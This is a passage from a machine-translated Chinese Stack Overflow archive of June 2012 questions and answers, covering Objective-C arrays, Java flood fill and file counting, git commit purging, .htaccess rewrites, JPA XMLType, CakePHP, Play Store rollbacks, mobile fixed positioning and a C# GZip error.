//nodeList was also synthesized at the beginning of the file with @synthesize.

//initialize array
nodeList= [[NSMutableArray alloc] initWithCapacity:(vertLinks*horizLinks)];

//make center node
Node *n = [Node alloc];

//Initialize the node (just puts an x and y position in, and gives it a mass)
[n nodeInit:(startX):(startY):(nodeMass)];
[nodeList addObject:(n)];

//creates a 'web' of nodes, and adds each one to the array
for (int i = 1; i < vertLinks; i++)
{
    for (int j = 0; j < horizLinks; j++)
    {
        //draw the line to each point
        int nodeX = (startX + cos(((360 / horizLinks) * j) * (M_PI / 180)) * rad * i);
        int nodeY = (startY + sin(((360 / horizLinks) * j) * (M_PI / 180)) * rad * i);

        //add it to the screen
        Node *nd = [Node alloc];

        [nd nodeInit:(nodeX):(nodeY):(nodeMass)];

        if (i == vertLinks - 1)
        {
            nd.solid = true;
        }

        [nodeList addObject:(nd)];
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T07:32:50.320

有点难以准确回答，但基本上你需要遍历数组中的对象，并分别添加每个对象。如果这些对象是 UIView、UIImageView 或 UIButton 之类的视图，那么您可以这样做：

```
for (int i=0; i<array.count; i++) {
   UIView *thisView = [array objectAtIndex:i];
   [self.view addSubview:thisView]
} 
```

如果它们是字符串或数字或其他东西，那么您需要创建标签或文本字段或其他东西来显示对象。

```
for (int i=0; i<array.count; i++) {
   NSString *string = [array objectAtIndex:i];
   UILabel *label = [[UILabel alloc] initWithFrame:CGRectMake(100, 100*i, 100, 100)];
   [label setTitle:string];
   [self.view addSubview:label]
} 
```

你在谈论什么对象类型真的很重要。如果您需要任何真正的帮助，您需要告诉我们这些是什么类型的图像。这也是正确的发帖方式。

请发布更多详细信息，我很乐意继续我的回答。

# java - Interviewstreet 谜题连接集

> ID：11271255
> 
> 赞同：0
> 
> 时间：2012-06-30T03:51:11.560
> 
> 标签：java, algorithm

> **可能重复：**
> [查找矩阵中连接集总数的算法](https://stackoverflow.com/questions/11253027/algorithm-to-find-the-total-number-of-connected-sets-in-a-matrix)

**问题：**

[https://amazonindia.interviewstreet.com/challenges/dashboard/#problem/4fd6570bd51e1](https://amazonindia.interviewstreet.com/challenges/dashboard/#problem/4fd6570bd51e1)

我的解决方案没有通过所有测试用例。但我无法指出我的代码将失败的场景。谁能指出我的代码有什么问题？

我的算法很简单，当您找到 1 时，使该位置的值等于一个名为 set 的变量，递增 1。最初设置为 1。然后检查该位置的邻居，如果它们中的任何一个为 1，则使其等于设置+1。

重复相同的操作，直到到达矩阵的右下角。现在增加 set 并重复该过程，直到矩阵中留下任何 1（我正在使用布尔左值来决定）。

**我的解决方案**

```
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class Solution {

    public static void main(String[] args) throws IOException {

               String no_of_tc;

        BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
        no_of_tc=br.readLine();
        int[] result=new int[Integer.parseInt(no_of_tc)];
        int mdim=0,maxset=0;
        boolean left=false;
        int i=0;
        boolean first=true;
        //boolean anyneighbour=false;
        for(i=0;i<Integer.parseInt(no_of_tc);i++)
        {
            maxset=0;
            left=false;
            first=true;
            mdim=Integer.parseInt(br.readLine());

            int[][] matrix=new int[mdim][mdim];
            String[] values=new String[mdim];
            int valuecount=0,counter=0,countchar=0;

            for(valuecount=0;valuecount<mdim;valuecount++)
            {
                countchar=0;
                values[valuecount]=br.readLine();
                for(counter=0;counter<mdim;counter++)
                {
                    char temp=(values[valuecount].charAt(countchar));
                    countchar=countchar+2;
                    matrix[valuecount]counter]=Character.getNumericValue(temp);
                }

            }

            int j=0,k=0,set=1;
            while(j<mdim)
            {

                while(k<mdim)
                {
                if(first)
                {
                    if(matrix[j][k]==1)
                    {
                        matrix[j][k]=set+1;
                        first=false;
                        maxset=set;
                    }
                }
                if(matrix[j][k]==set+1)
                {
                    if((j-1>=0)&&(k+1<mdim)&&(matrix[j-1][k+1]==1))
                    {
                        matrix[j-1][k+1]=set+1;
                        //anyneighbour=true;
                        //proceedwhole=proceedwhole+1;
                    }
                    if((j-1>=0)&&matrix[j-1][k]==1)
                    {
                        matrix[j-1][k]=set+1;
                        //anyneighbour=true;
                        //proceedwhole=proceedwhole+1;
                    }
                    if((j-1>=0)&&(k-1>=0)&&matrix[j-1][k-1]==1)
                    {
                        matrix[j-1][k-1]=set+1;
                        //anyneighbour=true;
                        //proceedwhole=proceedwhole+1;
                    }
                    if((k+1<mdim)&&matrix[j][k+1]==1)
                    {
                        matrix[j][k+1]=set+1;
                        //anyneighbour=true;
                        //proceedwhole=proceedwhole+1;
                    }

                    if((k-1>=0)&&matrix[j][k-1]==1)
                    {
                        matrix[j][k-1]=set+1;
                        //anyneighbour=true;
                        //proceedwhole=proceedwhole+1;

                    }

                    if((j+1<mdim)&& (k+1<mdim) && matrix[j+1][k+1]==1)
                    {
                        matrix[j+1][k+1]=set+1;
                        //anyneighbour=true;
                        //proceedwhole=proceedwhole+1;

                    }
                    if((j+1<mdim)&&matrix[j+1][k]==1)
                    {
                        matrix[j+1][k]=set+1;
                        //anyneighbour=true;
                        //proceedwhole=proceedwhole+1;

                    }
                    if((j+1<mdim)&&(k-1>=0)&&matrix[j+1][k-1]==1)
                    {
                        matrix[j+1][k-1]=set+1;
                        //anyneighbour=true;
                        //proceedwhole=proceedwhole+1;

                    }

//                  if(anyneighbour==false&&proceedwhole==1)
//                  {
//                      first=true;
//                      set=set+1;
//              
//                      result[i]=result[i]+1;
//                      break;
//                  }
//                  

                }
                else
                {

                    if(matrix[j][k]==1)
                    {

                        left=true;

                    }

                }

                k++;

            }
                k=0;
                j++;

                if(j==mdim)
                {
                    if(left==true)
                    {
                        j=0;
                    first=true;
                        left=false;

                        set=set+1;

                    }
                    else
                    {
                        result[i]=maxset;
                    }

                }
//              if(anyneighbour==false&&left==true)
//              {
//                  j=0;
//                  left=false;
//                  
//              }
            }

        }
        int counter2=0;

        for(counter2=0;counter2<Integer.parseInt(no_of_tc);counter2++)
        {
            System.out.println(result[counter2]);

        }

    }

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T04:48:39.540

这是您的代码失败的一个测试用例：

```
1
3
1 0 1
1 0 1
1 1 1 
```

这里只有 1 个组件。

此外，您的算法很慢。在没有连接到前一行`j`时，您正在重置每一行。`1`尝试洪水填充算法：[http ://en.wikipedia.org/wiki/Flood_fill](http://en.wikipedia.org/wiki/Flood_fill)

# c# - Visual Studio 2008 中复杂的 C#/ASP.NET 项目不堪重负

> ID：11271257
> 
> 赞同：6
> 
> 时间：2012-06-30T03:51:29.473
> 
> 标签：c#, asp.net, visual-studio, visual-studio-2008

我被聘为初级程序员，负责在一个非常庞大、复杂的解决方案中扩展现有功能的项目。代码库由 C#、ASP.NET、jQuery、javascript、html 和 xml 组成。

除了对面向对象编程及其继承、抽象、多态性和封装的基本概念的公平知识之外，我对所有这些都有一些了解。我可以通过其基类、接口、抽象类跟踪代码，并理解我在执行此操作时阅读的大部分代码。

然而，这个解决方案非常庞大，每当我浏览代码时，很多东西都被捆绑在一起，我感到完全不知所措。我经常发现自己无法完全了解正在序列化的对象、在相同页面上运行的大量 C# 和 javascript 以及从主要由标记组成的模板文件调用的方法所发生的一切。

我喜欢学习代码，但试图处理这个问题真的让我很紧张。

此外，我确实知道已经完成了大量的单元测试，但我对单元测试或如何使用它一无所知。

在使用 Visual Studio 2008 时，任何人都可以向我提供有关处理大型代码库的任何建议，我们将不胜感激。是否有工具可以帮助我了解正在发生的事情？也许即使在 Visual Studio 中也有一些我不知道的东西。我如何才能将代码跟踪到低级功能，以便更好地掌握高级别的情况？

# interface-builder - 如何检测故事板中丢失图像等错误？

> ID：11271258
> 
> 赞同：4
> 
> 时间：2012-06-30T03:51:54.793
> 
> 标签：interface-builder, xcode-storyboard, ibtool

有时，当我不断重构文件名和方法名时，我不会注意到丢失图像和丢失 IBActions。

我可以找到以下是 ibtool 的示例用法：

```
 ibtool --warnings --errors --notices file.nib > alerts.plist
          alerts.plist  will  contain  all warning, error, and notice mes-
          sages from file.nib. 
```

但它不会警告丢失图像或丢失 IBActions。

有没有办法有效地检测这些错误？

# jquery - 如何使用jQuery作为纯文本读取整个页面的html数据（包括文本输入）

> ID：11271259
> 
> 赞同：0
> 
> 时间：2012-06-30T03:52:08.880
> 
> 标签：jquery

[http://code.google.com/p/expbuilder/source/browse/#hg%2Fsrc%2Fcb](http://code.google.com/p/expbuilder/source/browse/#hg%2Fsrc%2Fcb)

我已经使用上面的代码来生成基于 Web 的查询生成器。

如何从构建的查询页面中读取整个 html 内容？

或者换句话说，如何将整个 html 表（包括文本和选择输入）数据读取为纯 html 文本。一旦我得到整个 html 文本，我就可以处理查询条件。谢谢你，史密斯

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T13:25:08.957

使用这样的方式：

基于选择器 ('html, body') 或 ('.myclass'), ecc...

```
 $('myselector').find('*').each(function(){
        if($(this).is('input')) alert($(this).val());
        if($(this).is('select')) alert($(this).find('option:selected').val());
        if($(this).is('p, div, span')) alert($(this).text());
    }); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-30T05:02:34.133

你在使用萤火虫或类似的东西吗？您可以查看 HTML 的变化。

如果您打算以编程方式使用代码，为什么不提高 DOM 的高度呢？

```
$('body').html() 
```

或者

```
$('table').html() 
```

# git - 从 git 数据库中完全删除提交

> ID：11271263
> 
> 赞同：18
> 
> 时间：2012-06-30T03:53:28.240
> 
> 标签：git

我需要一个提交才能不再出现在提交的 git 数据库中。我需要能够删除提交`abc123...`以便`git checkout abc123...`返回`error: pathspec 'abc123...' did not match any file(s) known to git.`

QA [Delete commits from a branch in Git](https://stackoverflow.com/questions/1338728/delete-commits-from-a-branch-in-git)部分回答了这个问题，例如如何从 HEAD 中删除对提交的引用，但它不包括查找提交所在的所有分支，也不包括过期和清除一旦它成为一个悬空提交，就提交。

我将如何实现这一目标？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-06-30T06:51:56.640

1.  列出所有包含提交的分支：

    ```
    git branch --contains COMMITSHA 
    ```

2.  从这些分支中删除提交：

    ```
    git checkout BRANCH
    git rebase -i COMMITSHA^
    # delete line with commit and save 
    ```

    如果在任何远程跟踪更改的分支，请使用覆盖将其推送到那里：

    ```
    git push --force REMOTE BRANCH 
    ```

    例如：

    ```
    git push --force origin master 
    ```

    （请注意，根据您的开发过程，提交也可能出现在未跟踪的远程分支中。）

3.  清除提交，使其无法从本地存储库中恢复：

    ```
    git reflog expire --all BRANCH1 BRANCH2 # list all branches you changed
    git prune --expire now 
    ```

    请注意，您还必须在具有此提交的所有远程存储库上运行此命令。如果您无权访问远程仓库，则必须双手合十——提交最终将自行过期并被`git gc`.

    请注意，上述命令将从 Git 存储库中删除*所有*悬空对象以及所有分支更改的历史记录——因此您将无法恢复（通过非取证方式）在其运行之前丢失的任何内容。

4.  告诉所有协作者获取更改的分支并更新他们可能基于它们所做的任何工作。他们应该这样做：

    ```
    git fetch REMOTE 
    ```

    对于基于您在上面更改的分支的每个分支（包括分支本身，如果他们在本地拥有它）：

    ```
    git checkout BRANCH
    git rebase REMOTE/BRANCH
    git reflog expire --all BRANCH 
    ```

    完成后：

    ```
    git prune --expire now 
    ```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-30T03:59:17.220

1.  确保没有 refs 需要该提交（重置回它之前，或者重新设置它）
2.  从中删除对象`.git/objects`（它将位于以哈希的前两个字符命名的文件夹中，文件名将是哈希的其余部分）。

但是请注意，如果您将此提交推送到公共存储库，则在本地将其删除不会将其从远程删除。

# java - 关于从项目 src 文件夹中选择所有 java 文件

> ID：11271265
> 
> 赞同：0
> 
> 时间：2012-06-30T03:53:39.877
> 
> 标签：java, io

我开发了一个应用程序，用户在其中选择特定文件夹，它计算该文件夹中的所有 java 文件以及这些文件中单独的代码行并显示在控制台中，但是在 java 项目中，有很多包，现在我有导航到一个特定的包，我想修改应用程序，当用户选择特定项目时，他将进一步导航到仅 src 文件夹，并且从 src 文件夹中所有包含 java 文件行的包都将被计算在内.

请告知如何实现这一点..以下是我的一段代码：

```
public class abc {

    /**
     * @param args
     * @throws FileNotFoundException
     */
    public static void main(String[] args) throws FileNotFoundException {

        JFileChooser chooser = new JFileChooser();
        chooser.setCurrentDirectory(new java.io.File("C:" + File.separator));
        chooser.setDialogTitle("FILES ALONG WITH LINE NUMBERS");
        chooser.setFileSelectionMode(JFileChooser.DIRECTORIES_ONLY);
        chooser.setAcceptAllFileFilterUsed(false);
                if (chooser.showOpenDialog(null) == JFileChooser.APPROVE_OPTION)
        {      Map<String, Integer> result = new HashMap<String, Integer>();
             File directory = new File(chooser.getSelectedFile().getAbsolutePath()); 
             int totalLineCount = 0;
             File[] files = directory.listFiles(new FilenameFilter(){
                  @Override
                  public boolean accept(File directory, String name) {
                      if(name.endsWith(".java"))
                      return true;
                    else
                      return false;              
                  }
                }
   );
              for (File file : files)
            {
                if (file.isFile())
                {    Scanner scanner = new Scanner(new FileReader(file));
                    int lineCount = 0;
                     try
                    { for (lineCount = 0; scanner.nextLine() != null; lineCount++) ;
                          } catch (NoSuchElementException e)
                    {   result.put(file.getName(), lineCount);
                    totalLineCount += lineCount;  
                                    }

                } }
              System.out.println("*****************************************");
              System.out.println("FILE NAME FOLLOWED BY LOC");
              System.out.println("*****************************************");

            for (Map.Entry<String, Integer> entry : result.entrySet())
            {   System.out.println(entry.getKey() + " ==> " + entry.getValue());
            }
            System.out.println("*****************************************");
            System.out.println("SUM OF FILES SCANNED ==>"+"\t"+result.size()); 
            System.out.println("SUM OF ALL THE LINES ==>"+"\t"+ totalLineCount);

             }     

    }

} 
```

现在我的代码的问题是，当我启动我的应用程序时，会打开一个对话框，我必须在其中浏览到最终包含 java 文件的完整包文件夹，但现在我想以这样的方式修改应用程序，以便当文件对话框打开，用户将仅导航到项目 src 文件夹，从那时起需要扫描 src 文件夹内的所有包和所有文件行代码，请告知..

我当时在想的是...

*   给定一个代表目录的文件对象（我们称之为目录）：
*   获取目录中的所有文件。
*   对于目录中的每个文件，（我们将其称为 thisFile）执行以下操作：
*   如果 thisFile 是目录，则从头开始使用 thisFile 作为目录
*   否则，如果 thisFile 是 .java 文件，请计算代码行数
*   否则，忽略此文件

如果将 main 分成方法，这会变得容易得多。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T05:29:50.947

代码在这里

```
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.FilenameFilter;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.NoSuchElementException;
import java.util.Scanner;
import javax.swing.JFileChooser;

public class abc {

    /**
     * @param args
     * @throws FileNotFoundException
     */
    private static int totalLineCount = 0;
    private static int totalFileScannedCount = 0;

    public static void main(String[] args) throws FileNotFoundException {

        JFileChooser chooser = new JFileChooser();
        chooser.setCurrentDirectory(new java.io.File("C:" + File.separator));
        chooser.setDialogTitle("FILES ALONG WITH LINE NUMBERS");
        chooser.setFileSelectionMode(JFileChooser.DIRECTORIES_ONLY);
        chooser.setAcceptAllFileFilterUsed(false);
        if (chooser.showOpenDialog(null) == JFileChooser.APPROVE_OPTION) {
            Map<String, Integer> result = new HashMap<String, Integer>();
            File directory = new File(chooser.getSelectedFile().getAbsolutePath());

            List<File> files = getFileListing(directory);

            //print out all file names, in the the order of File.compareTo()
            for (File file : files) {
                System.out.println("Directory: "+file);
                result = getFileLineCount(file);
                totalFileScannedCount +=  result.size();
            }

            System.out.println("*****************************************");
            System.out.println("FILE NAME FOLLOWED BY LOC");
            System.out.println("*****************************************");

            for (Map.Entry<String, Integer> entry : result.entrySet()) {
                System.out.println(entry.getKey() + " ==> " + entry.getValue());
            }
            System.out.println("*****************************************");
            System.out.println("SUM OF FILES SCANNED ==>" + "\t" + totalFileScannedCount);
            System.out.println("SUM OF ALL THE LINES ==>" + "\t" + totalLineCount);

        }

    }

    public static Map<String, Integer> getFileLineCount(File directory) throws FileNotFoundException {
        Map<String, Integer> result = new HashMap<String, Integer>();

        File[] files = directory.listFiles(new FilenameFilter() {

            @Override
            public boolean accept(File directory, String name) {
                if (name.endsWith(".java")) {
                    return true;
                } else {
                    return false;
                }
            }
        });
        for (File file : files) {
            if (file.isFile()) {
                Scanner scanner = new Scanner(new FileReader(file));
                int lineCount = 0;
                try {
                    for (lineCount = 0; scanner.nextLine() != null; lineCount++);
                } catch (NoSuchElementException e) {
                    result.put(file.getName(), lineCount);
                    totalLineCount += lineCount;
                }
            }
        }

        return result;
    }

    /**
     * Recursively walk a directory tree and return a List of all
     * Files found; the List is sorted using File.compareTo().
     *
     * @param aStartingDir is a valid directory, which can be read.
     */
    static public List<File> getFileListing(
            File aStartingDir) throws FileNotFoundException {
        validateDirectory(aStartingDir);
        List<File> result = getFileListingNoSort(aStartingDir);
        Collections.sort(result);
        return result;
    }

    // PRIVATE //
    static private List<File> getFileListingNoSort(
            File aStartingDir) throws FileNotFoundException {
        List<File> result = new ArrayList<File>();
        File[] filesAndDirs = aStartingDir.listFiles();
        List<File> filesDirs = Arrays.asList(filesAndDirs);
        for (File file : filesDirs) {
            if(file.isDirectory()) {
                result.add(file); 
            }
            if (!file.isFile()) {
                //must be a directory
                //recursive call!
                List<File> deeperList = getFileListingNoSort(file);
                result.addAll(deeperList);
            }
        }
        return result;
    }

    /**
     * Directory is valid if it exists, does not represent a file, and can be read.
     */
    static private void validateDirectory(
            File aDirectory) throws FileNotFoundException {
        if (aDirectory == null) {
            throw new IllegalArgumentException("Directory should not be null.");
        }
        if (!aDirectory.exists()) {
            throw new FileNotFoundException("Directory does not exist: " + aDirectory);
        }
        if (!aDirectory.isDirectory()) {
            throw new IllegalArgumentException("Is not a directory: " + aDirectory);
        }
        if (!aDirectory.canRead()) {
            throw new IllegalArgumentException("Directory cannot be read: " + aDirectory);
        }
    }
} 
```

# html - 删除尾部斜杠并重定向 html

> ID：11271268
> 
> 赞同：1
> 
> 时间：2012-06-30T03:55:22.650
> 
> 标签：html, .htaccess, redirect, slash, trailing

我遇到的问题是第一个 URL 有效，而第二个无效。

[http://www.example.com/podcast/episode1](http://www.example.com/podcast/episode1)
[http://www.example.com/podcast/episode1/](http://www.example.com/podcast/episode1/)

有没有办法将所有尾随斜杠版本重定向到非尾随斜杠版本？

这里的问题更严重，因为这些都不起作用：

example.com/podcast
example.com/podcast/

只有这个有效：

example.com/podcast.html

而且我不希望 html 扩展可见。

到目前为止，这是我在 .htaccess 文件中的代码：

```
#shtml

AddType text/html .html
AddHandler server-parsed .html

#html

RewriteEngine on
RewriteCond %{REQUEST_FILENAME} !-f
RewriteRule ^([^\.]+)$ $1.html [NC,L]

#index redirect

RewriteCond %{THE_REQUEST} ^[A-Z]{3,9}\ /index\.html\ HTTP/ 
RewriteRule ^index\.html$ http://example.com/ [R=301,L]

#non www to www

RewriteEngine On
RewriteCond %{HTTP_HOST} !^www\.
RewriteRule ^(.*)$ http://www.%{HTTP_HOST}/$1 [R=301,L] 
```

你能帮我吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-30T07:09:56.600

删除尾部斜杠很容易。删除`.html`不是。

# 删除斜线

如果您在那里看到斜线，只需 R=301 重定向。

`RewriteRule ^(.*)/$ $1 [R=301]`

不要添加`L`标志，因为您要继续处理此请求。也让它成为第一条规则。

# 为什么不能删除`.html`

您的问题是，一旦`page`变为`page.html`（通过内部重定向），就会向服务器发出**新**的请求。`page.html`因此，您的 .htaccess 将看到对 .htaccess 的请求`page.html`并重定向到`page`. 提示无限循环。

# 优化你的代码

1.  你只需要`RewriteEngine On`在你的顶部`.htaccess`
2.  您应该将`www`重定向添加到代码顶部并删除`L`标志（请参阅*删除斜线*）

# oracle - 使用 JPA 插入/更新 XMLType

> ID：11271274
> 
> 赞同：0
> 
> 时间：2012-06-30T03:56:36.440
> 
> 标签：oracle, jpa, oracle11g, jpa-2.0, eclipselink

我有一个带有 XMLType 列的 oracle 数据库。我已经为它实现了一个 DescriptorCustomizer，并且我在实体中使用 XMLType 作为我的字段类型。

基本上我有：

```
@Entity
@Customizer(XmlCustomizer.class) 
public class ...... {
    .....
private XMLType xmlColumn;
    .....
} 
```

这一切都非常适合从数据库中读取数据。但是当谈到持久化数据时，我不知道该怎么做。我还没有找到一种简单的方法来创建一个包含 xml 的 XMLType 对象。大多数方法似乎都要求一个非常丑陋的连接。那么我错过或误解了什么？

谢谢。

编辑：我忘了提到我确实让它与 XMLType 一起工作，但就像我说的那样，我必须将一个连接传递给我可以从我的 EntityManager 获得的数据库。虽然看起来很丑。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-03T13:16:49.357

XMLType 是 Oracle JDBC 类型，因此可能不是对象的最佳字段类型。

您可以将其映射到字符串或 DOM 文档，然后您可以编写它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T22:00:43.683

最新的 EclipseLink (2.4) 似乎将 XMLType 直接转换为 String 而无需定制器。

# cakephp - Cake PHP 启动时出现问题

> ID：11271275
> 
> 赞同：1
> 
> 时间：2012-06-30T03:56:47.720
> 
> 标签：cakephp, cakephp-1.3

我在 webroot 文件夹中有 css 和 js，但都没有加载...

它在萤火虫中出现错误

```
"NetworkError: 500 Internal Server Error - http://localhost/cakephp/"
"NetworkError: 404 Not Found - http://localhost/cakephp/css/common.css"
"NetworkError: 404 Not Found - http://localhost/cakephp/js/common.js" 
```

我的基本文件夹是**cakephp**。但是有些内容显示在页面（http://localhost/cakephp/）中，没有样式。内容来自数据库。

主要重定向链接也不起作用...

> 在此服务器上未找到请求的 URL /cakephp/videos/list。

只有主页显示内容...

布局页面

```
echo $this->Html->css('common');
echo $this->Html->css('dialog');
echo $this->Html->script('jquery.min'); 
echo $this->Html->script('common'); 
```

.htaccess

```
# compress text, html, javascript, css, xml:
SetOutputFilter DEFLATE
<IfModule mod_rewrite.c>
   RewriteEngine on
   RewriteRule    ^$ app/webroot/    [L]
   RewriteRule    (.*) app/webroot/$1 [L]
</IfModule> 
```

应用程序/.htaccess

```
<IfModule mod_rewrite.c>
    RewriteEngine on
    RewriteRule    ^$    webroot/    [L]
    RewriteRule    (.*) webroot/$1    [L]
 </IfModule> 
```

应用程序/webroot/.htaccess

```
<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteCond %{REQUEST_FILENAME} !-d
    RewriteCond %{REQUEST_FILENAME} !-f
    RewriteRule ^(.*)$ index.php?url=$1 [QSA,L]
</IfModule> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-30T08:43:44.320

你应该在你的 Apache 配置中启用 mod_rewrite，你可以在这里找到更多，[http://book.cakephp.org/2.0/en/development/routing.html](http://book.cakephp.org/2.0/en/development/routing.html)

如果您在第`app/config/core.php`84 行需要，您也可以将其关闭对 mod_rewrite 的需要

# android - Android 开发人员：从 Play 商店中删除旧版本

> ID：11271276
> 
> 赞同：0
> 
> 时间：2012-06-30T03:56:56.627
> 
> 标签：android, google-play

我是一名 android 开发人员，我刚刚发布了我的应用程序的新版本。但是由于一些错误，我需要拉出最新版本并恢复到旧版本。有没有办法从商店做到这一点？

我“停用”了最新版本并尝试“重新激活”旧版本，但出现以下错误：

```
Error: New APK version is lower than previous APK version. 
```

有没有办法可以删除最新版本并恢复到旧版本？

谢谢 ：）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T04:50:27.527

正如 Enigma 在您的评论中所说，您真的应该使用源代码管理，这样您将来就不会遇到这个问题。但是，在这种情况下，如果您有旧 apk 的副本（即使您没有旧源代码），也有一种解决方法。

[此](https://stackoverflow.com/questions/3122635/is-it-possible-to-decompile-an-android-apk-file)链接告诉您有关对 apk 进行逆向工程的信息。如果您只想获取 AndroidManifest.xml（您的版本代码应该在哪里），那么[APKTool](http://code.google.com/p/android-apktool/)对您来说应该足够了。从那里，`versionCode`按照 Enigma 的建议将其更新为比市场上的版本更新的版本，并将其推向市场。如果一切顺利，您的用户将使用旧版本。

如果你既没有旧版本的apk，也没有旧版本的源码，那你真的无能为力。（除非谷歌在他们的服务器上保存你应用的所有版本的存档）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-30T04:04:37.023

Upload the old binary again by changing the versionCode.

# jquery - 固定浮动菜单的定位以支持移动浏览器

> ID：11271281
> 
> 赞同：0
> 
> 时间：2012-06-30T03:58:18.407
> 
> 标签：jquery, html, css, mobile, css-position

我是一名 C# .NET 开发人员，但在 CSS 方面很糟糕，尽管在提问之前我确实付出了很大的努力。我正在使用一些基本的 jQuery、CSS 和 HTML 表格（是的，我知道表格）来构建我以前在 flash 中的唯一照片组合。我遇到的问题是在 iPhone 或 Android 等移动设备上查看网站时，在我的情况下使用 Galaxy S3 的屏幕截图，如果用户放大照片，我固定位置的菜单会移到顶部照片的。

编辑：我使用固定位置，以便菜单“浮动”在照片上的同一位置，并在用户滚动时跟随滚动条，使其在用户滚动到照片末尾时可访问。我已将 CSS 更新为第一个响应，但是当您滚动时菜单不再保留在屏幕上。我最初应该在帖子中包含此注释。

网站链接：http: [//briangarson.com](http://briangarson.com)

屏幕截图：

用户通过捏合放大 - 菜单浮在图像上方：

[![屏幕截图 1 - 放大](../Images/a80c1b937457c9c11281d53a3fd43ecf.png)](https://i.stack.imgur.com/o0hph.png)

未放大：

[![屏幕截图 1 - 放大](../Images/1b30ba0a94d6ca0b9fe14c0f84526c70.png)](https://i.stack.imgur.com/7LITM.png)
[（来源：[briangarson.com](http://briangarson.com/screen2.png)）]

我正在使用的代码（可能更容易在我的网站上查看源代码）但这里有

```
<style type="text/css">
body
{
    background-color: #FFFFFF;
}

.gallery
{
    height: 600px;
}

#content{
    margin-top: 50px;
}

#menu{
    margin-left: 15px;
    position: fixed;
}
table{
padding-top: 90px;
}
td{
    padding-left: 15px;
}
a{
color:#1A1A1A;
}
a.on{
    text-decoration: none;
}
</style> 
```

和 HTML

```
<div id="content">
    <div id="menu">
        <img  src="http://briangarson.com/logo.gif"> <a id="navSkate" class="on" href="#">Skate</a> | <a id="navMusic" href="#">Music</a> | <a id="navFashion" href="#">Fashion</a> | <A target=_blank href="mailto:photo@briangarson.com">Info</a>
    </div>
    <table>
    <tr id="fashion">
      <td><img class="gallery" src="photos/352cassandra_aylmer.jpg"></td>
      <td><img class="gallery" src="photos/811for_web_low_res_texture_0141-editweb.jpg"></td>
      <td><img class="gallery" src="photos/78420061105031421_carolina_01_floor_srgb.jpg"></td>
      <td><img class="gallery" src="photos/91720061127164637_kat_salute_srgb_01.jpg"></td>
      <td><img class="gallery" src="photos/997val__1262555511_4af982f854_o.jpg"></td>
      <td><img class="gallery" src="photos/43620060531234234_geoff.jpg"></td>
      <td><img class="gallery" src="photos/918christine_dsc_8737.jpg"></td>
      <td><img class="gallery" src="photos/471debbie.jpg"></td>
      <td><img class="gallery" src="photos/158alison_dsc_0602-edit.jpg"></td>
      <td><img class="gallery" src="photos/95madelaine_bw.jpg"></td>
      <td><img class="gallery" src="photos/971gabrielle_v3_bordered.jpg"></td>
      <td><img class="gallery" src="photos/917ioanna_dsc_1937-edit.jpg"></td>
      <td><img class="gallery" src="photos/96520061106010418_carolina_couch_01_srgb.jpg"></td>
      <td><div style="display: block; width:100px;">&nbsp;</div></td>
    </tr>
    </table>
</div> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-30T04:41:37.157

我从来没有遇到过固定定位的问题，主要是因为我不使用它，也就是说：我认为移动浏览器不支持`position:fixed`. 我相信你需要像下面这样->

```
#menu{
    margin-left: 15px
    position: absolute;
        top:50px;   
} 
```

上面的目的是保持与顶部相同的距离，如果它被绑定到 的尺寸`<div id="content>`。现在我们可以通过绑定到滚动事件来复制它。

```
$(document).scroll(function(){
  $('#menu').css('top', '50px');
}); 
```

我相信这就是你想要的效果。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-30T06:51:09.153

位置：固定；由于可能会破坏旧的桌面站点，因此无法在移动设备上正常工作。我知道的唯一支持位置固定的移动浏览器是 iOS 5+ 上的移动浏览器。

然而，它可以很容易地用几行 javascript 来修复。如何做到这一点的一个例子：

```
window.onscroll = function() {
    document.getElementById('fixedDiv').style.top =
        (window.pageYOffset + window.innerHeight - 25) + 'px';
}; 
```

看看这个问题：

[固定移动 Safari 中的定位](https://stackoverflow.com/questions/743123/fixed-positioning-in-mobile-safari)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-04-24T08:44:16.103

使用新的 ios safari 和 Chrome 手机浏览器**{position:fixed} 可以正常工作**。但是您仍然需要为旧浏览器添加 ployfill。

# c# - 使用 GZip 的异常

> ID：11271282
> 
> 赞同：0
> 
> 时间：2012-06-30T03:58:44.567
> 
> 标签：c#

大家好，我收到了这个例外：

`The magic number in GZip header is not correct. Make sure you are passing in a GZip stream.`

我所做的就是将文件解压缩为 GZip，然后将其传递到流中，然后将其传递到文件中。

```
using (FileStream fInStream = new FileStream(@"C:\Users\UNI\Desktop\FrostbyteDBUpdateProgram\FrostbyteDBUpdateProgram\bin\Debug\" + fileName, FileMode.Open, FileAccess.Read))
        {
            using (GZipStream gZip = new GZipStream(fInStream, CompressionMode.Decompress))
            {
                using (FileStream fOutStream = new FileStream(@"C:\Users\UNI\Desktop\FrostbyteDBUpdateProgram\FrostbyteDBUpdateProgram\bin\Debug\test1.docx", FileMode.Create, FileAccess.Write))
                {
                    byte[] tempBytes = new byte[4096];
                    int i;
                    while ((i = gZip.Read(tempBytes, 0, tempBytes.Length)) != 0)
                    {
                        fOutStream.Write(tempBytes, 0, i);
                    }
                }
                gZip.Close();
            }
            fInStream.Close();
        } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-30T10:40:27.830

